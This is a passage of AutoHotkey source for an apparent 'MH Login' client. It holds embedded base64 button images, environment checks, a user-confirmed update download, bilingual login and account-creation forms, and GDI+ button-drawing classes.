2ezore7PXT2ZB7rsmDk3O4+bJ/buqcOo3C9G1wVi9/UOv3t9pfaXL3RShY5lklg2lcKT3gA2NZN75cphmWlHUPXIidyYbGEaGfDxqsqVSuK/3wcBbnPlcrJUCoUiI6NLwfD2v+lmmwcomcTxTA4PhrJj47nJqaQ3OD7ja+GaTjVpYCb/OHc6PXyFGqMwkmJ5+q4KHzal1X07TCTUcsVutP3G0jPYg9/R6y5pgRDlhGdz64AoHBUKhUAwZ7HmrLblZ86rvGGYyqrSpTxkd3g0BTyZniGWVvKe9fwLZ8Lh7OqbJ7VoIbKKwTd8T28dADrV2N9MHxoa9+D7edBNR+kMbrbE+OK36gE+V1Cly5RKHFRIxQ0gkEgwnOxQO1o4ptMX+6Gm3v+jQ03auquP6FLLg8eucDR1WDwCmzA2Zw9epnzrJjkoSpihBGKx5XwBwpdwETGLAw4NhELlggMEZvBQqVTU1iZqo4JRKpW20bhAYLaNzgMWs8E+yJcIRVKZTK5QKGQoKmUeO/OjAob/AaZ455O2a/ZIAAAAAElFTkSuQmCC")
A_Args.PNG.engH := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.engS := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
}
Save := new OBJSave("SettingsOBJ.json")
Save.Login := 15
A_Args.FontDPI := 0
if (A_Language = "0416" || A_Language = "0816")
Save.LanguageOS := "por"
Else
Save.LanguageOS := "eng"
If (InStr(A_WorkingDir, "system32")){
Msg := {por:"Voc"Chr(234)" n"Chr(227)"o pode abrir este arquivo pelos Arquivos Recentes.`nVoc"Chr(234)" deve abrir direto pela pasta onde o arquivo est"Chr(225)".", eng:"You cannot open this file from Recent Files.`nYou must open it directly from the folder where this file is."}
MsgBox, 4112, Error!, % Msg[Save.LanguageOS]
ExitApp
}
If ((A_ScreenDPI <= 100 ? "100%" : "Error") = "Error") {
Msg := {por: "A Escala do seu Windows n"Chr(227)"o esta configurado para 100%.`n"
. "1. Clique com o bot"Chr(227)"o direito em qualquer espa"Chr(231)"o vazio da "Chr(225)"rea de trabalho e escolha Configura"Chr(231)Chr(245)"es de Exibi"Chr(231)Chr(227)"o.`n"
. "2. Em Ajustar a Escala e Layout, defina-o para 100%."
, eng: "The Scale and Layout of your Windows is not configured to 100%.`n"
. "1. Please right-click on any empty space on the desktop and choose Display Settings.`n"
. "2. Under Adjust Scale and Layout, set it to 100%."}
MsgBox, 4112, Error!, % Msg[Save.LanguageOS]
ExitApp
}
If (!A_Is64bitOS){
Msg := {por:"Seu Windows est"Chr(225)" 32 Bits`nPor favor formate para 64 Bits", eng:"Your Windows is in 32 Bit`nPlease format to 64 bit"}
MsgBox, 4112, Error!, % Msg[Save.LanguageOS]
ExitApp
}
If (A_PtrSize < 8){
Msg := {por:"AutoHotKey est"Chr(225)" 32 Bits`nPor favor instale o AHK em 64 Bits", eng:"AutoHotKey in 32 Bit`nPlease install AHK in 64 Bit"}
MsgBox, 4112, Error!, % Msg[Save.LanguageOS]
ExitApp
}
If (Save.Ling == "")
Save.Ling := Save.LanguageOS
LoadGDIplus()
Data := GuiLoad()
If (Save.Login < Data["MHLogin"]["Version"] && Data["MHLogin"]["Version"]){
Title := {por:"Atualiza"Chr(231)Chr(227)"o disponivel", eng:"Update available!"}
Msg := {por:"Seu MH Login est"Chr(225)" no v" Save.Login "`nE o atual est"Chr(225)" no v" Data["MHLogin"]["Version"] "`n`nDeseja Atualizar?", eng:"Your MH Login is in v" Save.Login "`nAnd the current is in v" Data["MHLogin"]["Version"] "`n`nWant to Update?"}
MsgBox, 4, % Title[Save.LanguageOS], % Msg[Save.LanguageOS]
IfMsgBox Yes
{
Gdip_GetFile(Data["MHLogin"]["Link"], "MHLogin_v" Data["MHLogin"]["Version"] ".ahk")
Title := {por:"Completo", eng:"Complete"}
Msg := {por:"Por favor abra o MHLogin_v" Data["MHLogin"]["Version"] ".ahk", eng:"Please open the MHLogin_v" Data["MHLogin"]["Version"] ".ahk"}
MsgBox,, % Title[Save.LanguageOS], % Msg[Save.LanguageOS]
ExitApp
}
}
Data["Link"]["01"] := "https://macro-helpers.com:2447/AHK"
LoadImages()
CreateGui(){
MHGui := new classGui("MyGui","MHGui","-DPIScale -Caption -0x20000 +LastFound")
MHGui.GuiSetFont(9 - A_Args.FontDPI, "Tahoma", "cE6E6E6 bold")
MHGui.Add("HBITMAP", 01, "x0  y0 w330 +BackgroundTrans")
MHGui.Add("HBITMAP", 02, "x0  y0  +BackgroundTrans")
MHGui.Add("CustomText", 01, "x45 y3")
MHGui.Add("IMGButton", 01, "x302 y0 ")
if (Save.Ling = "por"){
MHGui.Add("HBITMAP"  , { "Label": "por", "W": 31, "H": 20, "PNG" : "PorS", "Window": ""}, "x230 y1")
MHGui.Add("IMGButton", { "Label": "eng", "W": 31, "H": 20, "PNG1": "Eng" , "PNG2": "EngH", "Func": "SetLing", "Window": ""}, "x+5 y1")
} else {
MHGui.Add("IMGButton", { "Label": "por", "W": 31, "H": 20, "PNG1": "Por" , "PNG2": "porH", "Func": "SetLing", "Window": ""}, "x230 y1")
MHGui.Add("HBITMAP"  , { "Label": "eng", "W": 31, "H": 20, "PNG" : "EngS", "Window": ""}, "x+5 y1")
}
MHGui.NewParent("Login","-caption -DPIScale ")
MHGui.GuiSetColor(242424,333333,"Login")
MHGui.Add("HBITMAP", 03, "x55 y40 +BackgroundTrans")
MHGui.Add("IMGButton", 02, "x250 y249")
MHGui.Add("IMGSwitch", {Load:"Config", GuiColor:"FF242424", W:18,H:18, label: "Hide", Window:"Login"}, "x280 y101")
MHGui.Add("DefText", 01, "+Section x22 y105 w60 Right")
if (MHGui.Controls.Hide.State == 1)
MHGui.Add("Edit", 01, "w184 h18 x+6 ys-3 -E0x200 +Border Password")
else
MHGui.Add("Edit", 01, "w184 h18 x+6 ys-3 -E0x200 +Border")
MHGui.Add("DefText", 02, "xs y+5 w60 Right")
MHGui.Add("Edit", 02, "w184 h18 x+6 ys+19 -E0x200 +Border Password")
MHGui.Add("Button2", 01, "x115 y+15")
MHGui.Add("Button2", 02, "x85  y+10")
MHGui.NewParent("Create","-caption -DPIScale ")
MHGui.GuiSetColor(242424,333333,"Create")
MHGui.Show("Hide x0 y25 w330 h275","Create")
MHGui.NewParent("Games","-caption -DPIScale ")
MHGui.GuiSetColor(242424,333333,"Games")
MHGui.Show("Hide x0 y25 w330 h275","Games")
MHGui.Controls["Edit01"].Focus()
MHGui.Show("w330 h300")
MHGui.Show("x0 y25 w330 h275","Login")
}
F01(Hwnd) {
static Make
Save.Save(Save)
1 := "Login"
2 := Save.Config.Edit01
3 := Save.Config.Edit02
4 := Save.Ling
5 := A_PtrSize=8 ? "x64" : "x32"
6 := A_Args.JS.Token
Data.Send := Data.Login
Loop, 6
Data.Send := StrReplace(Data.Send, "!" A_Index, %A_Index%)
r := TryLogin(Data.Send, 01)
If (r.Type == 420)
MsgData(r.error, 4112)
}
F07() {
1 := "Update"
2 := MHGui.Controls.Edit03.GetText()
3 := MHGui.Controls.Edit04.GetText()
4 := MHGui.Controls.Edit05.GetText()
5 := MHGui.Controls.Edit07.GetText()
6 := MHGui.Controls.Edit08.GetText()
7 := Save.Ling
8 := A_Args.JS.Token
if (!IsValidEmail(MHGui.Controls.Edit04.GetText())){
MsgData(02, 4112)
Return
}
If (MHGui.Controls.Edit05.GetText() != MHGui.Controls.Edit06.GetText()){
MsgData(03, 4112)
Return
}
Data.Send := Data.Create
Loop, 8
Data.Send := StrReplace(Data.Send, "!" A_Index, %A_Index%)
r := TryCreate(Data.Send, 01)
If (r.Type == 420)
MsgData(r.error, 4112)
}
F02(Hwnd) {
If (!A_Args.CreateAccount){
MHGui.Add("DefText", 03, "+Section x5 y60 w115 Right")
MHGui.Add("DefText", 04, "xs y+8 w115 Right")
MHGui.Add("DefText", 05, "xs y+7 w115 Right")
MHGui.Add("DefText", 06, "xs y+8 w115 Right")
MHGui.Add("DefText", 07, "xs y+7 w115 Right")
MHGui.Add("DefText", 08, "xs y+7 w115 Right")
MHGui.Add("Edit", 03, "w190 h18 xs+120 ys-3 -E0x200 +Border")
MHGui.Add("Edit", 04, "w190 h18  y+4 -E0x200 +Border")
MHGui.Add("Edit", 05, "w190 h18  y+4 -E0x200 +Border Password")
MHGui.Add("Edit", 06, "w190 h18  y+4 -E0x200 +Border Password")
MHGui.Add("Edit", 07, "w190 h18  y+4 -E0x200 +Border")
MHGui.Add("Edit", 08, "w190 h18  y+4 -E0x200 +Border")
MHGui.Add("Button1", 01, "x60 y235")
MHGui.Add("Button1", 02, "x+15")
A_Args.CreateAccount := 1
}
MHGui.Controls.CustomText01.Set({eng: "Create Account", por: "Criar Conta"})
MHGui.Show(,"Create")
MHGui.Hide("Login")
}
F08() {
MHGui.Controls.CustomText01.Set({por: "Tela de Login", eng: "Login Screen"})
MHGui.Show(,"Login")
MHGui.Hide("Create")
}
SetLing(Hwnd) {
Save.Ling := A_GuiControl
Save.Save(Save)
Gui, MyGui:Destroy
A_Args.CreateAccount := ""
CreateGui()
}
F03(Hwnd) {
Save.Save(Save)
ExitApp
}
F04(Hwnd) {
Run % Data.Link.02
}
F05() {
Save.Write("Config","Edit01", A_GuiControl)
}
F06() {
Save.Write("Config","Edit02", A_GuiControl)
}
OnMessage(0x200, "ButtonHover")
ButtonHover( wparam, lparam, msg ) {
Static MToolTip, HoverOn, Key, Hand := DllCall("LoadCursor", "ptr", 0, "ptr", 32649), Help := DllCall("LoadCursor", "ptr", 0, "ptr", 32651), Wait := DllCall("LoadCursor", "ptr", 0, "ptr", 32650), Cross := DllCall("LoadCursor", "ptr", 0, "ptr", 32515), Arrow := DllCall("LoadCursor", "ptr", 0, "ptr", 32512)
MouseGetPos,VarX,VarY,, ctrl , 2
GControl := MHGui.BTHwnd["H" ctrl] ? MHGui.BTHwnd["H" ctrl] : A_GuiControl
if (!HoverOn && GControl && MHGui.Controls[GControl].Hover = 1)
MHGui.Controls[GControl].Draw_Hover(), HoverOn := 1, Key := GControl
else if (HoverOn = 1 && GControl != Key)
MHGui.Controls[Key].Draw_Default(), HoverOn := 0, Key := ""
if (Key)
SetTimer, ButtonHoverOFF , -100
if (GControl && Mouse := MHGui.Controls[GControl].Mouse) {
if (Mouse)
Data.CurrentCursor := %Mouse%, DllCall("SetCursor", "ptr", %Mouse%)
}
else if (!Mouse && Data.CurrentCursor )
Data.CurrentCursor := 0, DllCall("SetCursor", "ptr", Arrow)
If (MHGui.Controls[GControl].Bar = 1) {
X := MHGui.Controls[GControl].X
Y := MHGui.Controls[GControl].Y
AClick := (VarX - X) > 100 ? 100 : (VarX - X) < 0 ? 0 : (VarX - X)
MToolTip := 1
ToolTip, % AClick
}
else If (MToolTip = 1) {
MToolTip := 0
ToolTip
}
if (wparam=1 && !A_Args.MoveTest)
PostMessage, 0xA1, 2,,, A
}
OnMessage(0x20A, "Funcs")
Funcs(wparam, lparam, msg){
MouseGetPos,,,, ctrl , 2
GControl := MHGui.BTHwnd["H" ctrl]
If (MHGui.Controls[GControl].Bar = 1){
wparam := wparam = 7864320 ? 1 : -1
MHGui.Controls[GControl].Set_Pin(MHGui.Controls[GControl].AClick + wparam, 1)
}
}
OnMessage(0x20,  "WM_SETCURSOR")
WM_SETCURSOR(wParam, lParam) {
HitTest := lParam & 0xFFFF
if (HitTest=1 && Data.CurrentCursor!=0) {
DllCall("SetCursor", "ptr", Data.CurrentCursor)
return true
}
}
ButtonHoverOFF() {
MouseGetPos,,,VarWin,,2
WinGetTitle, title, ahk_id %VarWin%
if (title != "MyGui")
ButtonHover(0, 0, "Timer")
}
OnMessage(0x204, "GuiContext")
GuiContext( wparam, lparam, msg, hwndID ) {
}
OnMessage(0x102, "WMChar")
WMChar(wP) {
Switch SubStr(A_GuiControl, 1 , 3)
{
Case "Num":
Stat := 1
Case "AnZ":
Stat := 2
Default:
Stat := 0
}
If (Stat == 0)
Return
If ( Stat == 1){
If (wP=8)
Return
wP := Chr(wP)
If (wP is not digit) {
Gui, Submit, NoHide
Return, 0
}
}
If ( Stat == 2){
vPos := RegExMatch(Chr(wP), "[A-Za-z]")
If (wP=32 || wP=8)
Return
If (!vPos) {
Gui, Submit, NoHide
Return, 0
}
}
}
class classGui {
__new(Name, Var, Options:="+LastFound") {
This.Var      := Var
This.Name     := Name
This.Title    := Name
This.BTHwnd   := Object()
This.Controls := Object()
This.Child    := Object()
Gui, % This.Name ": " Options " hwndHwnd"
This.Hwnd := Hwnd
Gui, % This.Name ":Default"
This.GuiSetMargins()
}
NewParent(Name, Options:="+LastFound", Window:="", Title:="") {
Title := Title ? Title : Name
Hwnd := Window ? This.Child[%Window%.Hwnd] : This.Hwnd
Gui, % Name ":New", % Options " +parent" This.Hwnd
This.Child[Name] := {Name: Name, Title: Title, Hwnd: WinExist()}
DF := This.DefaultFont
Gui, % Name ":Font", % "s" DF.Size " " DF.Options, % DF.Font
}
Add(Type,Valor,Options:="") {
obj := Valor
if (!IsObject(obj))
obj := Data["Add"][Type][obj]
try
Label := RegExReplace(obj.Label, "[^A-z0-9_]")
Catch
Label := Type Valor
try
Window := obj.Window
If (!Window)
Window := This.Name
v := This[Type]
This.Controls[Label] := new v(obj,Options,Label,Window,This.Var)
}
ClearContents() {
for Name, CtrlObj in This.TextCtrl
CtrlObj.SetText()
}
CheckForContents() {
for Name, CtrlObj in This.TextCtrl
if(CtrlObj.GetText()!="")
return 1
return 0
}
Activate() {
WinActivate % "ahk_id " This.Hwnd
}
Show(Options:="",Window:="") {
Window := Window ? Window : This.Name
if(This.GuiX!="" and This.GuiY!="")
Gui, % Window ":Show", % Options " x" This.GuiX " y" This.GuiY, % This.Title
else
Gui, % Window ":Show", % Options, % This.Title
}
Hide(Window:="") {
Window := Window ? Window : This.Name
Gui, % Window ":Hide"
}
Minimize() {
Window := Window ? Window : This.Name
WinMinimize % "ahk_id " This.Hwnd
}
GuiSetTitle(NewTitle:="") {
This.Title := NewTitle
Gui, % This.Name ":Show",, % This.Title
return
}
GuiSetMargins(X:=4, Y:=4) {
Gui, % This.Name ":Margin", %X%, %Y%
}
GuiSetFont(Size:=10, Font:="", Options:="", Window:="") {
Window := Window ? Window : This.Name
If (Window = This.Name)
This.DefaultFont := {Size: Size, Font: Font, Options: Options}
Gui, % Window ":Font", s%Size% %Options%, %Font%
}
GuiSetColor(Background:="", Foreground:="", Window:="") {
Window := Window ? Window : This.Name
Gui, % Window ":Color", %Background%, %Foreground%
}
GuiSetOptions(Options, Window:="") {
Window := Window ? Window : This.Name
Gui, % Window ":" Options
}
GuiSetCoords(X, Y) {
This.GuiX := X
This.GuiY := Y
}
GuiSetPos(X, Y) {
DetectHiddenWindows, On
WinMove, % "ahk_id " This.Hwnd,, % x, % y
DetectHiddenWindows, Off
}
AddTextField(CtrlType, LabelText, FieldText:="", Width:="", TextOptions:="", FieldOptions:="", DataControl:=1) {
This.Add("Text", LabelText, "+Section w" Width " " TextOptions,, DataControl)
This.Add(CtrlType, FieldText, "w" Width " " FieldOptions, LabelText, DataControl)
}
class HBITMAP {
__New(obj,Options,Label,Window,vGlobal) {
This.Window := Window
This.PNG := obj.PNG
Gui, % This.Window ": Add", Picture, % Options " HwndHwnd", % "HBITMAP:*" A_Args.PNG[This.PNG]
This.Hwnd := Hwnd
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
}
}
class Edit {
__New(obj,Options,Label,Window,vGlobal) {
static  i:=1
Try
Load := Save[obj.Load][Label]
Try
Func := obj.Func
Try
Block := obj.Block
if (Block)
Options .= " v" Block i++
if (Func)
Options .= " g" Func
This.Hwnd := This.Create(Window, Options, Load)
This.Window := Window
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
}
Create(Window, Options, Load){
static
Gui, % Window ": Add", Edit, % Options " HwndHwnd", % Load
Return Hwnd
}
GetText() {
ControlGetText, T,, % "ahk_id " This.Hwnd
return T
}
SetText(T:="") {
ControlSetText,, % T, % "ahk_id " This.Hwnd
}
Focus() {
ControlFocus,, % "ahk_id " This.Hwnd
}
}
class DefText {
__New(obj,Options,Label,Window,vGlobal) {
This.Window := Window
Try
FontOptions := obj.FontOptions
Try
Font := obj.Font
If (FontOptions && Font)
Gui, % This.Window ": Font", % FontOptions, % Font
Gui, % This.Window ": Add", Text, % "0x200 HwndHwnd " Options, % obj[Save.Ling]
If (FontOptions || Font){
DF := %vGlobal%["DefaultFont"]
Gui, % Window ":Font", % "s" DF.Size " " DF.Options, % DF.Font
}
This.Hwnd := Hwnd
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
}
}
class Button1 {
__New(obj,Options,Label,Window,vGlobal) {
This.W := obj.W
This.H := obj.H
This.BColor := "0x" obj.GuiColor
This.Color := "0x" obj.Color
This.FColorTop := "0x" obj.FColor
This.FColorBottom := "0x" obj.FColorB
This.Font := obj.Font
This.Font_Size := obj.FOptions
This.Roundness := obj.Roundness
This.Func := obj.Func
This.Label := Label
This.Window := Window
This.Mouse := "Hand"
This.Hover := 1
This.Create_Bitmap(obj[Save.Ling])
Gui , % Window ": Add" , Picture , % Options " w" This.W " h" This.H " hwndHwnd 0xE", % Label
This.Hwnd := Hwnd
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
BD := THIS.Pressed.BIND( THIS )
GUICONTROL +G , % Hwnd , % BD
This.Draw_Default()
}
Pressed() {
if (!This.Draw_Pressed())
return
If (This.Func){
FuncRun := This.Func
%FuncRun%(This.Hwnd,A_GuiControl)
}
}
Draw_Pressed() {
SetImage( This.Hwnd , This.Pressed_Bitmap )
A_Args.MoveTest := 1
While( GetKeyState( "LButton" ))
sleep , 10
A_Args.MoveTest := 0
MouseGetPos,,,, ctrl , 2
if( This.Hwnd != ctrl ){
This.Draw_Default()
return False
} else {
This.Draw_Hover()
return true
}
}
Draw_Default() {
SetImage( This.Hwnd , This.Default_Bitmap )
}
Draw_Hover() {
SetImage( This.Hwnd , This.Hover_Bitmap )
}
Editor(Text,FColorTop:="") {
If (FColorTop)
This.FColorTop := "0xFF" FColorTop
DeleteObject( This.Hover_Bitmap )
DeleteObject( This.Pressed_Bitmap )
DeleteObject( This.Default_Bitmap )
This.Create_Bitmap(Text)
SetImage( This.Hwnd , This.Default_Bitmap )
}
Create_Bitmap(Text) {
pBitmap:=Gdip_CreateBitmap( This.W , This.H )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G , 2 )
Brush := Gdip_BrushCreateSolid( This.BColor )
Gdip_FillRectangle( G , Brush , -1 , -1 , This.W+2 , This.H+2 )
Gdip_DeleteBrush( Brush )
Brush := Gdip_CreateLineBrushFromRect( 0 , 0 , This.W , This.H , "0xFF61646A" , "0xFF2E2124" , 1 , 1 )
Gdip_FillRoundedRectangle( G , Brush , 0 , 1 , This.W , This.H-3 , This.Roundness )
Gdip_DeleteBrush( Brush )
Brush := Gdip_CreateLineBrushFromRect( 0 , 0 , This.W , This.H , "0xFF4C4F54" , "0xFF35373B" , 1 , 1 )
Gdip_FillRoundedRectangle( G , Brush , 1 , 2 , This.W-2 , This.H-5 , This.Roundness )
Gdip_DeleteBrush( Brush )
Pen := Gdip_CreatePen( "0xFF1A1C1F" , 1 )
Gdip_DrawRoundedRectangle( G , Pen , 0 , 0 , This.W , This.H-2 , This.Roundness )
Gdip_DeletePen( Pen )
Brush := Gdip_BrushCreateSolid( This.FColorBottom )
Gdip_TextToGraphics( G , Text , "s" This.Font_Size " Center vCenter c" Brush " x1 y2 " , This.Font , This.W , This.H-1 )
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.FColorTop )
Gdip_TextToGraphics( G , Text , "s" This.Font_Size " Center vCenter c" Brush " x0 y1 " , This.Font , This.W , This.H-1 )
Gdip_DeleteBrush( Brush )
Gdip_DeleteGraphics( G )
This.Default_Bitmap := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DisposeImage(pBitmap)
pBitmap:=Gdip_CreateBitmap( This.W , This.H )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G , 2 )
Brush := Gdip_BrushCreateSolid( This.BColor )
Gdip_FillRectangle( G , Brush , -1 , -1 , This.W+2 , This.H+2 )
Gdip_DeleteBrush( Brush )
Brush := Gdip_CreateLineBrushFromRect( 0 , 0 , This.W , This.H , "0xFF61646A" , "0xFF2E2124" , 1 , 1 )
Gdip_FillRoundedRectangle( G , Brush , 0 , 1 , This.W , This.H-3 , This.Roundness )
Gdip_DeleteBrush( Brush )
Brush := Gdip_CreateLineBrushFromRect( 0 , 0 , This.W , This.H , "0xFF55585D" , "0xFF3B3E41" , 1 , 1 )
Gdip_FillRoundedRectangle( G , Brush , 1 , 2 , This.W-2 , This.H-5 , This.Roundness )
Gdip_DeleteBrush( Brush )
Pen := Gdip_CreatePen( "0xFF1A1C1F" , 1 )
Gdip_DrawRoundedRectangle( G , Pen , 0 , 0 , This.W , This.H-2 , This.Roundness )
Gdip_DeletePen( Pen )
Brush := Gdip_BrushCreateSolid( This.FColorBottom )
Gdip_TextToGraphics( G , Text , "s" This.Font_Size " Center vCenter c" Brush " x1 y2" , This.Font , This.W , This.H-1 )
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.FColorTop )
Gdip_TextToGraphics( G , Text , "s" This.Font_Size " Center vCenter c" Brush " x0 y1" , This.Font , This.W , This.H-1 )
Gdip_DeleteBrush( Brush )
Gdip_DeleteGraphics( G )
This.Hover_Bitmap := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DisposeImage(pBitmap)
